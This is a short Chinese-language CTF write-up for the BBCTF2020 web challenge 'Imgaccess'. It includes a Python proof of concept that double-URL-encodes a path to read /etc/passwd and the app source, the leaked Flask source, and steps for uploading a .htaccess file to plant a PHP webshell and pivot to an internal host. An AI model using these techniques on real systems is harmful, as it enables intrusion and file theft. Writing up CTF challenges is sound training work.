# BBCTF2020

## Imgaccess

上传图片，caption么得用

fuzz的时候发现一个事情是读图片路径似乎是直接根据url的路径来判断的，看起来像python写的

然后想办法在路径里加料，发现双urlencode能搞

POC:

```python
#coding=utf-8
import requests
from urllib import *

url = "http://34398c53-2f42-4c15-852e-09f33ac1bd4b.node3.buuoj.cn/uploads/"

path = quote(quote_plus("../../../etc/passwd"))

req = requests.get(url+path)

print req.text
```

``../app.py``拿到源码

```python
from flask import Flask, render_template, request, flash, redirect, send_file
from urllib.parse import urlparse
import re
import os
from hashlib import md5
import asyncio
import requests

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = os.path.join(os.curdir, "uploads")
# app.config['UPLOAD_FOLDER'] = "/uploads"
app.config['MAX_CONTENT_LENGTH'] = 1*1024*1024
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
ALLOWED_EXTENSIONS = {'png', 'jpg', 's'}#很明显要利用这个s

if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.mkdir(app.config['UPLOAD_FOLDER'])

def secure_filename(filename):
    return re.sub(r"(\.\.|/)", "", filename) #过滤..和/ 那么可以传 .htacces..s 来上传.htaccess

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route("/")
def index():
    return render_template("home.html")

@app.route("/upload", methods=["POST"])
def upload():
    caption = request.form["caption"]
    file = request.files["image"]

    if file.filename == '':
        flash('No selected file')
        return redirect("/")
    elif not allowed_file(file.filename):
        flash('Please upload images only.')
        return redirect("/")
    else:
        if not request.headers.get("X-Real-IP"):
           ip = request.remote_addr
        else:
           ip = request.headers.get("X-Real-IP")
        dirname = md5(ip.encode()).hexdigest()
        filename = secure_filename(file.filename)
        upload_directory = os.path.join(app.config['UPLOAD_FOLDER'], dirname)
        if not os.path.exists(upload_directory):
            os.mkdir(upload_directory)
        upload_path = os.path.join(app.config['UPLOAD_FOLDER'], dirname, filename)
        file.save(upload_path)
        return render_template("uploaded.html", path = os.path.join(dirname, filename))

@app.route("/view/<path:path>")
def view(path):
    return render_template("view.html", path = path)

@app.route("/uploads/<path:path>")
def uploads(path):
    # TODO(noob):
    # zevtnax told me use apache for static files. I've
    # already configured it to serve /uploads_apache but it
    # still needs testing. I'm a security noob anyways.
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], path))

if __name__ == "__main__":
    app.run(port=5000)
```

可以利用``secure_filename``上传.htaccess，试了一下发现能用php，一句话getshell

注意要访问的是``/uploads_apache``来进行apache解析

emmm 然后找flag

``/``么得``./``么得，``find /``也找不到,那么看看内网....

连上shell用蚁剑的插件扫扫....

然后发现在子网某个ip的1337端口是open的

没有curl 用wget打一下，发现是个网页，然后提示``./flag.txt``

在wget一次就拿到flag了